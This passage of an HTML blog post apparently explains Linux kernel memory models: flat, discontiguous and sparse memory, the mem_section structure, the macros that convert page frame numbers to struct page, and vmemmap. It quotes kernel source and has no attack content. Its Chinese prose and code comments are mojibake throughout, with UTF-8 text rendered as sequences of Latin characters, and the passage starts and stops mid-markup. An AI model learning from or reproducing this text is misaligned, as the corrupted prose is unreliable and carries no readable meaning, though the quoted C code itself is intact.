href="#II-ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„-struct-page-å­˜å‚¨æ–¹å¼" class="headerlink" title="II.ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„ struct page å­˜å‚¨æ–¹å¼"></a>II.ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„ struct page å­˜å‚¨æ–¹å¼</h2><p>Linux æä¾›äº†ä¸‰ç§å†…å­˜æ¨¡å‹ï¼Œå®šä¹‰äº <code>include/asm-generic/memory_model.h</code> ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå·çš„å›¾ï¼Œä¾µåˆ ï¼‰ï¼š</p><p><img src="https://i.loli.net/2021/11/25/wLzFuCB5n1DAIY7.png" alt="image.png"></p><p>å†…å­˜æ¨¡å‹åœ¨ç¼–è¯‘æœŸå°±ä¼šè¢«ç¡®å®šä¸‹æ¥ï¼Œç›®å‰å¸¸ç”¨çš„æ˜¯ <code>Sparse Memory</code> æ¨¡å‹ï¼Œå³ç¦»æ•£å†…å­˜æ¨¡å‹</p><h3 id="Flat-Memory"><a href="#Flat-Memory" class="headerlink" title="Flat Memory"></a>Flat Memory</h3><p>å¹³æ»‘å†…å­˜æ¨¡å‹ã€‚ç‰©ç†å†…å­˜åœ°å€è¿ç»­ï¼Œæœ‰ä¸€ä¸ª<strong>å…¨å±€å˜é‡</strong> <code>mem_map</code> â€”â€”ç”±ä¸€ä¸ªå¤§çš„ struct page æ•°ç»„ç›´æ¥å¯¹åº”ç°æœ‰çš„ç‰©ç†å†…å­˜</p><h3 id="Discontiguous-Memory"><a href="#Discontiguous-Memory" class="headerlink" title="Discontiguous Memory"></a>Discontiguous Memory</h3><p>éè¿ç»­æ€§å†…å­˜æ¨¡å‹ã€‚ä¸»è¦é’ˆå¯¹å†…å­˜ä¸­å­˜åœ¨ç©ºæ´çš„æƒ…å†µã€‚</p><p>å¯¹äºæ¯ä¸€æ®µè¿ç»­çš„ç‰©ç†å†…å­˜ï¼Œéƒ½æœ‰ä¸€ä¸ª <code>pglist_data</code> ç»“æ„ä½“è¿›è¡Œå¯¹åº”ï¼Œå…¶æˆå‘˜ <code>node_mem_map</code> ä¸ºä¸€ä¸ª struct page æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ª page ç»“æ„ä½“æ•°ç»„ï¼Œç”±è¯¥ç»“æ„ä½“å¯¹åº”åˆ°è¯¥æ®µè¿ç»­ç‰©ç†å†…å­˜</p><p>æœ‰ä¸€ä¸ª<strong>å…¨å±€å˜é‡</strong> <code>node_data</code> ä¸ºä¸€ä¸ª pglist_data æŒ‡é’ˆæ•°ç»„ï¼Œå…¶ä¸­å­˜æ”¾ç€æŒ‡å‘æ¯ä¸€ä¸ª pglist_data çš„æŒ‡é’ˆï¼Œè¯¥æ•°ç»„çš„å¤§å°ä¸º <code>MAX_NUMNODES</code></p><h3 id="Sparse-Memory"><a href="#Sparse-Memory" class="headerlink" title="Sparse Memory"></a>Sparse Memory</h3><p>ç¦»æ•£å†…å­˜æ¨¡å‹ã€‚åœ¨ä¸€ä¸ª mem_section ç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ª <code>section_mem_map</code> æˆå‘˜æŒ‡å‘ä¸€ä¸ª struct page æ•°ç»„å¯¹åº”ä¸€æ®µè¿ç»­çš„ç‰©ç†å†…å­˜ï¼Œå³å°†å†…å­˜æŒ‰ç…§ section ä¸ºå•ä½è¿›è¡Œåˆ†æ®µ</p><p>å­˜åœ¨ä¸€ä¸ªå…¨å±€æŒ‡é’ˆæ•°ç»„ <code>mem_section</code> ï¼ˆä¸ç»“æ„ä½“åŒåï¼‰å­˜æ”¾æ‰€æœ‰çš„ <code>mem_section</code> æŒ‡é’ˆï¼ŒæŒ‡å‘<strong>ç†è®ºä¸Šæ”¯æŒçš„å†…å­˜ç©ºé—´</strong>ï¼Œæ¯ä¸ª section å¯¹åº”çš„ç‰©ç†å†…å­˜ä¸ä¸€å®šå­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™æ­¤æ—¶è¯¥ section çš„æŒ‡é’ˆä¸º NULL</p><p>è¿™ç§æ¨¡å‹<strong>æ”¯æŒå†…å­˜çš„çƒ­æ‹”æ’</strong></p><blockquote><p>å›¾è¿˜æ˜¯å·çš„ï¼Œä¾µåˆ </p></blockquote><p><img src="https://i.loli.net/2021/11/25/RN47OEoaM31xQhA.png" alt="image.png"></p><h4 id="mem-section-ç»“æ„ä½“"><a href="#mem-section-ç»“æ„ä½“" class="headerlink" title="mem_section ç»“æ„ä½“"></a>mem_section ç»“æ„ä½“</h4><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * é€»è¾‘ä¸Šè¿™æŒ‡å‘ä¸€ä¸ª pages ç»“æ„ä½“æ•°ç»„ï¼Œ</span></span><br><span class="line"><span class="comment">     * ç„¶è€Œï¼Œä»–çš„å­˜å‚¨è¿˜æœ‰ä¸€äº›åˆ«çš„é­”åŠ›</span></span><br><span class="line"><span class="comment">     * (å‚è§ sparse.c::sparse_init_one_section())</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * æ­¤å¤–ï¼Œåœ¨å¼•å¯¼çš„æ—©æœŸï¼Œæˆ‘ä»¬å¯¹æ­¤å¤„èŠ‚åŒºçš„ä½ç½®çš„</span></span><br><span class="line"><span class="comment">     * èŠ‚ç‚¹çš„idè¿›è¡Œç¼–ç ï¼Œä»¥æŒ‡å¼•åˆ†é…ã€‚</span></span><br><span class="line"><span class="comment">     * (å‚è§ sparse.c::memory_present())</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * å°†ä¹‹å£°æ˜ä¸ºä¸€ä¸ª unsigned longï¼Œè‡³å°‘å¯ä»¥è®©äººåœ¨</span></span><br><span class="line"><span class="comment">     * é”™è¯¯ä½¿ç”¨ä¹‹å‰å®Œæˆä¸€æ¬¡ï¼ˆç±»å‹ï¼‰è½¬æ¢</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> section_mem_map;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_section_usage</span> *<span class="title">usage</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * è‹¥æ˜¯ SPARSEMEM, pgdat æ²¡æœ‰ page_ext æŒ‡é’ˆ.</span></span><br><span class="line"><span class="comment">     * æˆ‘ä»¬ä½¿ç”¨ section. (å…³äºè¿™ä¸ªï¼Œå‚è§ page_ext.h)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">page_ext</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pad;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * è­¦å‘Š: mem_section çš„å¤§å°å¿…é¡»æ˜¯2çš„å¹‚æ¬¡æ–¹ï¼Œ ä»¥ä¾¿äº</span></span><br><span class="line"><span class="comment">     * è®©è®¡ç®—ä¸ä½¿ç”¨ SECTION_ROOT_MASK æœ‰æ„ä¹‰</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="CONFIG-SPARSEMEM-EXTREME-ï¼šåŠ¨æ€åˆ†é…-mem-section-æ•°ç»„"><a href="#CONFIG-SPARSEMEM-EXTREME-ï¼šåŠ¨æ€åˆ†é…-mem-section-æ•°ç»„" class="headerlink" title="_CONFIG_SPARSEMEM_EXTREME_ï¼šåŠ¨æ€åˆ†é… mem_section æ•°ç»„"></a>_CONFIG_SPARSEMEM_EXTREME_ï¼šåŠ¨æ€åˆ†é… <code>mem_section</code> æ•°ç»„</h4><p>å†…æ ¸ç¼–è¯‘é€‰é¡¹ä¹‹ä¸€ï¼Œè‹¥å¼€å¯äº†åˆ™è¿ <code>mem_section</code> æ•°ç»„çš„ç©ºé—´ä¹Ÿæ˜¯åŠ¨æ€åˆ†é…çš„ï¼Œåœ¨ section è¾ƒå¤šçš„æƒ…å†µä¸‹é€šå¸¸ä¼šå¼€å¯è¿™ä¸ªç¼–è¯‘é€‰é¡¹</p><h4 id="å…¨å±€-mem-section-æ•°ç»„"><a href="#å…¨å±€-mem-section-æ•°ç»„" class="headerlink" title="å…¨å±€ mem_section æ•°ç»„"></a>å…¨å±€ mem_section æ•°ç»„</h4><p>è¯¥æ•°ç»„ä¸­å­˜æ”¾ç€æŒ‡å‘æ‰€æœ‰ mem_section ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œå®šä¹‰äº <code>/mm/sparse.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> **<span class="title">mem_section</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> <span class="title">mem_section</span>[<span class="title">NR_SECTION_ROOTS</span>][<span class="title">SECTIONS_PER_ROOT</span>]</span></span><br><span class="line"><span class="class">    ____<span class="title">cacheline_internodealigned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>è‹¥æœªå¼€å¯ <em>CONFIG_SPARSEMEM_EXTREME</em> ç¼–è¯‘é€‰é¡¹åˆ™ mem_section ä¸ºä¸€ä¸ªå¸¸è§„çš„<strong>äºŒç»´æ•°ç»„</strong>ï¼Œå¦åˆ™ä¸ºä¸€ä¸ª<strong>äºŒçº§æŒ‡é’ˆ</strong>ï¼Œå…¶æ‰€æŒ‡å‘ç©ºé—´å†…å­˜åŠ¨æ€åˆ†é…</p><p>å¯¹äºåä¸€ç§æƒ…å†µï¼Œå…¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/12/03/wVpetDxj5gRlfWN.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><h4 id="PFN-ä¸-page-ç»“æ„ä½“é—´çš„è½¬æ¢"><a href="#PFN-ä¸-page-ç»“æ„ä½“é—´çš„è½¬æ¢" class="headerlink" title="PFN ä¸ page ç»“æ„ä½“é—´çš„è½¬æ¢"></a>PFN ä¸ page ç»“æ„ä½“é—´çš„è½¬æ¢</h4><p>kernel ä¸­æä¾›äº†ä¸¤ä¸ªç”¨ä»¥åœ¨ PFNï¼ˆPage Frame Numerï¼‰ ä¸ page ç»“æ„ä½“ä¹‹é—´è¿›è¡Œè½¬æ¢çš„å®ï¼Œå®šä¹‰äº <code>/include/asm-generic/memory_model.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SPARSEMEM)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note: èŠ‚åŒºçš„ mem_map è¢«ç¼–ç ä»¥è¡¨ç¤ºå…¶ start_pfn.</span></span><br><span class="line"><span class="comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __page_to_pfn(pg)                    \</span></span><br><span class="line"><span class="meta">(&#123;    const struct page *__pg = (pg);                \</span></span><br><span class="line"><span class="meta">    int __sec = page_to_section(__pg);            \</span></span><br><span class="line"><span class="meta">    (unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));    \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __pfn_to_page(pfn)                \</span></span><br><span class="line"><span class="meta">(&#123;    unsigned long __pfn = (pfn);            \</span></span><br><span class="line"><span class="meta">    struct mem_section *__sec = __pfn_to_section(__pfn);    \</span></span><br><span class="line"><span class="meta">    __section_mem_map_addr(__sec) + __pfn;        \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_FLATMEM/DISCONTIGMEM/SPARSEMEM */</span></span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼š<strong>mem_section ç»“æ„ä½“çš„ section_mem_map ä¸­å­˜å‚¨çš„ä¸º page æ•°ç»„ä¸ PFN çš„å·®å€¼</strong></p><h5 id="ï¼ˆ1ï¼‰page-ç»“æ„ä½“åˆ°-PFNï¼špage-ç»“æ„ä½“åœ°å€å‡å»å¯¹åº”-mem-section-gt-section-mem-map"><a href="#ï¼ˆ1ï¼‰page-ç»“æ„ä½“åˆ°-PFNï¼špage-ç»“æ„ä½“åœ°å€å‡å»å¯¹åº”-mem-section-gt-section-mem-map" class="headerlink" title="ï¼ˆ1ï¼‰page ç»“æ„ä½“åˆ° PFNï¼špage ç»“æ„ä½“åœ°å€å‡å»å¯¹åº” mem_section-&gt;section_mem_map"></a>ï¼ˆ1ï¼‰page ç»“æ„ä½“åˆ° PFNï¼špage ç»“æ„ä½“åœ°å€å‡å»å¯¹åº” mem_section-&gt;section_mem_map</h5><p>è¯¥å®é¦–å…ˆä¼šä½¿ç”¨ <code>page_to_section()</code> <strong>é€šè¿‡ page ç»“æ„ä½“çš„ flags å­—æ®µ</strong>è·å–è¯¥ page æ‰€å±çš„ section æ ‡å·ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/include/linux/mm.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">page_to_section</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åä½¿ç”¨ <code>__nr_to_section()</code> æ¥è·å–å¯¹åº”çš„ mem_section ç»“æ„ä½“çš„åœ°å€ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">nr_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">nr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line">    <span class="keyword">if</span> (!mem_section)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (!mem_section[SECTION_NR_TO_ROOT(nr)])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;mem_section[SECTION_NR_TO_ROOT(nr)][nr &amp; SECTION_ROOT_MASK];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªå® <code>SEECTION_NR_TO_ROOT</code>ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECTIONS_PER_ROOT       (PAGE_SIZE / sizeof (struct mem_section))</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECTIONS_PER_ROOT    1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECTION_NR_TO_ROOT(sec)    ((sec) / SECTIONS_PER_ROOT)</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é»˜è®¤å¼€å¯ <code>CONFIG_SPARSEMEM_EXTREME</code>ï¼Œæ­¤æ—¶ <code>SECTION_PER_ROOT</code> æ„ä¸ºä¸€å¼ é¡µä¸­ mem_section ç»“æ„ä½“çš„æ•°é‡ï¼Œå³å® <code>SEECTION_NR_TO_ROOT</code> å¾—åˆ°çš„æ˜¯å¯¹åº”çš„_é¡µä¸‹æ ‡_ï¼Œä¹‹åå†é€šè¿‡ mem_section æ ‡å·ä¸æ¯é¡µä¸­ mem_section æ•°é‡ - 1ï¼ˆ<code>SECTION_ROOT_MASK</code>ï¼‰åšä¸è¿ç®—æœ€ç»ˆå¾—åˆ°è¯¥ mem_section åœ¨è¯¥é¡µè¿™ä¸€ mem_section æ•°ç»„ä¸­çš„ä¸‹æ ‡</p><p>ä¹‹åé€šè¿‡ <code>__section_mem_map_addr()</code> è·å–åˆ° mem_section ç»“æ„ä½“ä¸­çš„ section_mem_map æˆå‘˜ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">section_mem_map_addr</span>(<span class="keyword">struct</span> <span class="title">mem_section</span> *<span class="title">section</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="built_in">map</span> = section-&gt;section_mem_map;</span><br><span class="line">    <span class="built_in">map</span> &amp;= SECTION_MAP_MASK;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> page *)<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åä¸ page ç»“æ„ä½“çš„åœ°å€åšå·®è¿ç®—ä¾¿èƒ½è·å¾—å…¶ PFNï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨è¿™é‡Œè¿›è¡Œçš„æ˜¯ <em>page ç»“æ„ä½“æŒ‡é’ˆé—´çš„è¿ç®—</em> è€Œéç®€å•çš„åœ°å€åŠ å‡æ³•ï¼Œè®¡ç®—è¿‡ç¨‹ä¸ºï¼š<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p><h5 id="ï¼ˆ2ï¼‰PFN-åˆ°-page-ç»“æ„ä½“ï¼šé¡µæ¡†å·åŠ ä¸Šå¯¹åº”-mem-section-gt-section-mem-map"><a href="#ï¼ˆ2ï¼‰PFN-åˆ°-page-ç»“æ„ä½“ï¼šé¡µæ¡†å·åŠ ä¸Šå¯¹åº”-mem-section-gt-section-mem-map" class="headerlink" title="ï¼ˆ2ï¼‰PFN åˆ° page ç»“æ„ä½“ï¼šé¡µæ¡†å·åŠ ä¸Šå¯¹åº” mem_section-&gt;section_mem_map"></a>ï¼ˆ2ï¼‰PFN åˆ° page ç»“æ„ä½“ï¼šé¡µæ¡†å·åŠ ä¸Šå¯¹åº” mem_section-&gt;section_mem_map</h5><p>è¯¥å®é¦–å…ˆä½¿ç”¨ <code>__pfn_section()</code> æ¥è·å–åˆ° PFN æ‰€å±çš„ mem_sectionï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">pfn_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>pfn_to_section_nr()</code> å®šä¹‰å¦‚ä¸‹ï¼Œç”¨ä»¥è·å–å¯¹åº”çš„ section çš„ç´¢å¼•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">pfn_to_section_nr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> pfn)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªå® <code>PFN_SECTION_SHIFT</code>ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_SECTION_SHIFT    (SECTION_SIZE_BITS - PAGE_SHIFT)</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>SECTION_SIZE_BIT</code> è¡¨ç¤ºä¸€ä¸ª section çš„å¤§å°ï¼ˆæ’å®šä¸º2çš„å¹‚æ¬¡æ–¹ï¼‰æ‰€å ä½æ•°ï¼Œè€Œ <code>PAGE_SHIFT</code> åˆ™ä¸ºä¸€ä¸ªé¡µçš„å¤§å°ï¼ˆé€šå¸¸ä¸º4096ï¼‰æ‰€å ä½æ•°ï¼Œå‰è€…ç§»ä½åè€…æ‰€å¾—ä¸º_ä¸€ä¸ª section ä¸­é¡µçš„æ•°é‡_</p><p>ç”±é¡µæ¡†å·ç§»ä½ï¼ˆæœ¬è´¨ä¸ºé™¤æ³•ï¼‰å•ä¸ª section ä¸­é¡µçš„æ•°é‡ä¾¿èƒ½å¾—åˆ°å…¶æ‰€å± section æ ‡å·</p><p>ä¹‹åä½¿ç”¨ <code>__nr_to_section()</code> æ¥è·å–å¯¹åº”çš„ mem_section ç»“æ„ä½“çš„åœ°å€ï¼Œæœ€åä½¿ç”¨ <code>__section_mem_map_addr()</code> è·å–åˆ° mem_section ç»“æ„ä½“ä¸­çš„ section_mem_map æˆå‘˜åå†ä¸é¡µæ¡†å·åš <em>æŒ‡é’ˆåŠ æ³•</em> ä¾¿èƒ½è·å–åˆ°å¯¹åº”çš„ page ç»“æ„ä½“æ•°ç»„ï¼Œè®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼š<br>$$<br>PFN - section_mem_map &#x3D; PFN - (address_{mem_map} - start_PFN)\<br>&#x3D; (PFN - start_PFN )+ address_{mem_map}<br>\<br>&#x3D;address_{struct\ page}<br>$$</p><h4 id="Sparse-Memory-virtual-memmap"><a href="#Sparse-Memory-virtual-memmap" class="headerlink" title="*Sparse Memory virtual memmap"></a><em>*Sparse Memory virtual memmap</em></h4><p>åŸºäºSparse Memory å†…å­˜æ¨¡å‹ä¸Šå¼•å…¥äº† vmemmap çš„æ¦‚å¿µï¼Œæ˜¯ç›®å‰ Linux æœ€å¸¸ç”¨çš„å†…å­˜æ¨¡å‹ä¹‹ä¸€</p><blockquote><p>å›¾ä¾ç„¶æ˜¯å·çš„ï¼Œä¾µåˆ </p></blockquote><p><img src="https://i.loli.net/2021/11/25/mnAUkENCoRwjtpq.png" alt="image.png"></p><p>åœ¨å¼€å¯äº† vmemmap ä¹‹åï¼Œæ‰€æœ‰çš„ mem_section ä¸­çš„ page éƒ½æŠ½è±¡åˆ°ä¸€ä¸ªè™šæ‹Ÿæ•°ç»„ vmemmap ä¸­ï¼Œè¿™æ ·åœ¨è¿›è¡Œstruct page * å’Œ pfn è½¬æ¢æ—¶ï¼Œç›´æ¥ä½¿ç”¨ vmemmap æ•°ç»„å³å¯</p><h1 id="0x02-struct-zoneï¼šåŒº"><a href="#0x02-struct-zoneï¼šåŒº" class="headerlink" title="0x02.struct zoneï¼šåŒº"></a>0x02.struct zoneï¼šåŒº</h1><p>åœ¨ Linux ä¸‹å°†ä¸€ä¸ªèŠ‚ç‚¹å†…ä¸åŒç”¨é€”çš„å†…å­˜åŒºåŸŸåˆ’åˆ†ä¸ºä¸åŒçš„ <code>åŒºï¼ˆzoneï¼‰</code>ï¼Œå¯¹åº”ç»“æ„ä½“ <code>struct zone</code>ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 